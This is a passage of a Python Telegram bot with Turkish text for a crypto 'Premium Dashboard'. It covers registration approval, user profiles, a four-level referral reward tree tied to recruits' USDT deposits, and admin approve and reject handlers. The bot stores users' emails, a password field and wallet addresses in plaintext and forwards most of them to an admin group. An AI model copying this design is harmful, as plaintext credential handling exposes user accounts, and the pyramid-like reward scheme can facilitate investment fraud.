async def kayit_onayla(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()

    # invited_by bilgisi
    invited_by = data.get('invited_by')

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # Eğer kullanıcı zaten varsa güncelle (invited_by'yi koru)
    cursor.execute("SELECT telegram_id FROM users WHERE telegram_id = ?", (user_id,))
    existing = cursor.fetchone()
    if existing:
        cursor.execute(
            """UPDATE users SET 
            username = ?, 
            invited_by = ?, 
            status = 'PENDING', 
            borsa_uid = ?, 
            yatirim_miktari = ?, 
            mail = ?, 
            sifre = ?, 
            cuzdan_adresi = ?
            WHERE telegram_id = ?""",
            (
                data.get('username', callback.from_user.username or "Bilinmiyor"),
                invited_by,
                data.get('borsa_uid'),
                data.get('yatirim_miktari', 0.0),
                data.get('mail'),
                data.get('sifre'),
                data.get('cuzdan_adresi'),
                user_id,
            )
        )
    else:
        cursor.execute(
            """INSERT INTO users
            (telegram_id, username, invited_by, status, borsa_uid, yatirim_miktari, mail, sifre, cuzdan_adresi)
            VALUES (?, ?, ?, 'PENDING', ?, ?, ?, ?, ?)""",
            (
                user_id,
                data.get('username', callback.from_user.username or "Bilinmiyor"),
                invited_by,
                data.get('borsa_uid'),
                data.get('yatirim_miktari', 0.0),
                data.get('mail'),
                data.get('sifre'),
                data.get('cuzdan_adresi'),
            )
        )
    conn.commit()
    conn.close()

    # Referans bilgisini göster
    ref_info = ""
    if invited_by:
        ref_info = f"\n🔗 Referans ID: <code>{invited_by}</code>"

    await callback.message.edit_text(
        f"✅ <b>Kaydınız başarıyla alındı!</b>\n\n"
        f"📋 Bilgileriniz yöneticiye iletildi.{ref_info}\n"
        f"⏳ Onay süresi: 24-48 saat.\n\n"
        f"Onay aldığınızda <b>Premium Dashboard</b>'a erişebileceksiniz.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👤 Profilim", callback_data="menu_profil")]
        ])
    )

    # Admin'e bildirim
    username = callback.from_user.username or str(user_id)
    try:
        await bot.send_message(
            ADMIN_GROUP_ID,
            f"🔔 <b>YENİ KAYIT BAŞVURUSU</b>\n\n"
            f"👤 Kullanıcı: @{username} (<code>{user_id}</code>)"
            f"{ref_info}\n"
            f"🏦 Borsa Kayıt: Tamamlandı\n"
            f"🆔 Kimlik Doğrulama: Yapıldı\n"
            f"💰 Yatırım: Yapıldı\n"
            f"🆔 Borsa UID: <code>{data.get('borsa_uid', '—')}</code>\n"
            f"💰 Yatırım Miktarı: <b>{data.get('yatirim_miktari', 0):.2f}</b> USDT\n"
            f"📧 E-posta: <code>{data.get('mail', '—')}</code>\n"
            f"🔗 Cüzdan: <code>{data.get('cuzdan_adresi', '—')}</code>\n"
            f"📅 Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n\n"
            f"⬇️ Karar verin:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ Onayla", callback_data=f"admin_approve:{user_id}"),
                    InlineKeyboardButton(text="❌ Reddet", callback_data=f"admin_reject:{user_id}"),
                ]
            ])
        )
    except Exception as e:
        logger.error(f"Admin bildirimi hatası: {e}")

    await state.clear()
    await callback.answer("Kayıt tamamlandı!")


# --- KAYIT İPTAL ---
@router.callback_query(F.data == "kayit_iptal")
async def kayit_iptal(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "❌ <b>Kayıt işlemi iptal edildi.</b>\n\n"
        f"/start komutuyla yeniden başlayabilirsiniz.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Tekrar Başla", callback_data="kayit_basla")]
        ])
    )
    await callback.answer()


# --- BEKLE ---
@router.callback_query(F.data == "bekle")
async def callback_bekle(callback: CallbackQuery):
    await callback.answer(
        "⏳ Onayınız bekleniyor. Lütfen bekleyiniz.\nİşlem süresi: 24-48 saat.",
        show_alert=True
    )


# --- PROFİL ---
@router.callback_query(F.data == "menu_profil")
async def callback_profil(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = kullanici_getir(user_id)

    if not user:
        await callback.answer("Profil bulunamadı.", show_alert=True)
        return

    status_badges = {
        'APPROVED': '✅ Onaylı',
        'PENDING': '⏳ Onay Bekliyor',
        'REJECTED': '❌ Reddedildi',
    }
    status_label = status_badges.get(user[3], user[3])

    # Referans bilgisi
    ref_msg = f"\n🔗 Referans: <code>ID {user[2]}</code>" if user[2] else "\n🔗 Referans: Yok"

    text = (
        f"👤 <b>Profiliniz</b>\n\n"
        f"📊 Durum: {status_label}\n"
        f"💰 Bakiye: {user[4]:.2f} PUAN\n"
        f"🔒 Bloke: {user[5]:.2f} PUAN\n"
        f"🆔 Borsa UID: <code>{user[6] or 'Belirlenmemiş'}</code>\n"
        f"💰 Yatırım: {user[7]:.2f} USDT\n"
        f"📧 E-posta: <code>{user[8] or 'Belirlenmemiş'}</code>\n"
        f"🔗 Cüzdan: <code>{user[10] or 'Belirlenmemiş'}</code>\n"
        f"{ref_msg}\n"
        f"📅 Kayıt: {user[11]}"
    )

    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()


# --- REFERANS AĞACI ---
@router.callback_query(F.data == "menu_ref_tree")
async def callback_ref_tree(callback: CallbackQuery):
    user_id = callback.from_user.id

    if not kullanici_onayli(user_id):
        await callback.answer(
            "⏳ Referans bilgilerinize onay aldıktan sonra erişebilirsiniz.",
            show_alert=True
        )
        return

    tree = get_ref_tree(user_id)
    bot_info = await bot.get_me()

    # Odul bilgisi
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT SUM(miktar) FROM odul_gecmisi WHERE odul_verilen_id = ?",
        (user_id,)
    )
    toplam_odul = cursor.fetchone()[0] or 0
    conn.close()

    text = (
        f"🌳 <b>Referans Ağacınız</b>\n\n"
        f"1. Derinlik: {tree[1]} kullanıcı → %2 oran\n"
        f"2. Derinlik: {tree[2]} kullanıcı → %1.5 oran\n"
        f"3. Derinlik: {tree[3]} kullanıcı → %1 oran\n"
        f"4. Derinlik: {tree[4]} kullanıcı → %0.5 oran\n"
        f"📊 Toplam Referans: {sum(tree.values())}\n\n"
        f"💰 Kazanılan Toplam Ödül: <b>{toplam_odul:.2f}</b> PUAN\n\n"
        f"🔗 <b>Referans Linkiniz:</b>\n"
        f"<code>https://t.me/{bot_info.username}?start=ref_{user_id}</code>\n\n"
        f"💡 Linkinizi paylaşarak PUAN kazanın!\n"
        f"<i>Her referansın yatırım miktarına göre oran uygulanır.</i>"
    )

    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()


# ============================================================
# ADMIN ONAY/REDDET
# ============================================================
@router.callback_query(F.data.startswith("admin_approve:"))
async def admin_approve(callback: CallbackQuery):
    if callback.message.chat.id != ADMIN_GROUP_ID:
        await callback.answer("Yetkiniz yok.", show_alert=True)
        return

    try:
        user_id = int(callback.data.split(":")[1])
    except (ValueError, IndexError):
        await callback.answer("Geçersiz veri.", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    # Kullanıcı bilgilerini al (yatırım miktarı ve invited_by için)
    cursor.execute(
        "SELECT yatirim_miktari, invited_by, username FROM users WHERE telegram_id = ?",
        (user_id,)
    )
    user_row = cursor.fetchone()

    if not user_row:
        conn.close()
        await callback.answer("Kullanıcı bulunamadı.", show_alert=True)
        return

    yeni_yatirim = user_row[0] or 0.0
    invited_by = user_row[1]
    yeni_username = user_row[2]

    # Status güncelle
    onay_tarihi_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute(
        "UPDATE users SET status = 'APPROVED', onay_tarihi = ? WHERE telegram_id = ?",
        (onay_tarihi_str, user_id)
    )
    conn.commit()
    conn.close()

    # Ödül dağıtımı için invited_by kontrolü
    oduller = []
    if invited_by:
        logger.info(f"🔗 Kullanıcı {user_id}, Referans ID: {invited_by}")
        oduller = odul_dagit(user_id, yeni_yatirim)

    # Admin mesajı güncelle
    odul_msg = ""
    if oduller:
        odul_msg = "\n\n<b>🏆 Referans Ödülleri Dağıtıldı:</b>\n"
        for o in oduller:
            odul_msg += (
                f"  📍 {o['derinlik']}. Derinlik (@{o['username'] or 'Bilinmiyor'}): "
                f"<b>+{o['miktar']:.2f}</b> PUAN ({o['oran']*100}% × {yeni_yatirim:.2f})\n"
            )
    else:
        odul_msg = "\n\n<i>Referans zinciri yok veya sadece onaylı olmayan kullanıcılar mevcut.</i>"

    # Admin mesajını güncelle (edit_text hata verirse yeni mesaj gönder)
    try:
        await callback.message.edit_text(
            callback.message.text + f"\n\n✅ <b>ONAYLANDI</b>{odul_msg}",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.warning(f"Admin mesajı güncellenemedi: {e}")
        try:
            await callback.message.reply(
                f"✅ <b>ONAYLANDI</b>{odul_msg}",
                parse_mode="HTML"
            )
        except Exception:
            pass

    # Kullanıcıya bildirim gönder
    try:
        await bot.send_message(
            user_id,
            f"🎉 <b>Tebrikler!</b>\n\n"
            f"✅ Kaydınız onaylandı!\n\n"
            f"Artık <b>Premium Dashboard</b>'a erişebilirsiniz.\n"
            f"🚀 /start komutuyla panelinizi açın.\n\n"
            f"💡 Referans linkinizi paylaşarak yatırım miktarınıza göre "
            f"<b>PUAN</b> kazanabilirsiniz.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🚀 Premium Dashboard", web_app=WebAppInfo(url=WEB_APP_URL))],
                [InlineKeyboardButton(text="👤 Profilim", callback_data="menu_profil")],
                [InlineKeyboardButton(text="👥 Referanslarım", callback_data="menu_ref_tree")],
            ])
        )
        logger.info(f"✅ Onay bildirimi kullanıcı {user_id} gönderildi.")
    except Exception as e:
        logger.error(f"❌ Kullanıcıya onay bildirimi hatası (user_id={user_id}): {e}")
        try:
            await callback.answer(
                f"Onaylandı ama kullanıcıya bildirim gönderilemedi: {str(e)[:50]}",
                show_alert=True
            )
        except Exception:
            pass

    await callback.answer(f"Kullanıcı {user_id} onaylandı." + (f" {len(oduller)} ödül dağıtıldı." if oduller else ""))


@router.callback_query(F.data.startswith("admin_reject:"))
async def admin_reject(callback: CallbackQuery):
    if callback.message.chat.id != ADMIN_GROUP_ID:
        await callback.answer("Yetkiniz yok.", show_alert=True)
        return

    try:
        user_id = int(callback.data.split(":")[1])
    except (ValueError, IndexError):
        await callback.answer("Geçersiz veri.", show_alert=True)
        return

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET status = 'REJECTED', onay_tarihi = ? WHERE telegram_id = ?",
        (datetime.now(), user_id)
    )
    conn.commit()
    conn.close()

    try:
        await callback.message.edit_text(
            callback.message.text + "\n\n❌ <b>REDDEDİLDİ</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

    try:
        await bot.send_message(
            user_id,
            f"❌ <b>Kaydınız Reddedildi</b>\n\n"
            f"Yeni bilgilerle tekrar kayıt olabilirsiniz.\n\n"
            f"🔄 /start komutuyla yeniden başlayın.",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Kullanıcıya red bildirimi hatası: {e}")

    await callback.answer(f"Kullanıcı {user_id} reddedildi.")


# ============================================================
# BAŞLATICI
# ============================================================
async def main():
    veritabanini_hazirla()
    dp.include_router(router)
    asyncio.create_task(periyodik_yedekleme())

    web_runner = web.AppRunner(create_web_app())
    await web_runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(web_runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"🌐 Web sunucusu http://0.0.0.0:{port} üzerinde çalışıyor")

    logger.info("🤖 Premium Bot & Web App Aktif!")
    logger.info(f"🏆 Referans oranları: 1.%2 | 2.%1.5 | 3.%1 | 4.%0.5")
    logger.info(f"💰 Çekim eşiği: {MIN_WITHDRAW} PUAN")

    await dp.start_polling(bot, skip_updates=True)
    await web_runner.cleanup()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("Bot durduruldu.")
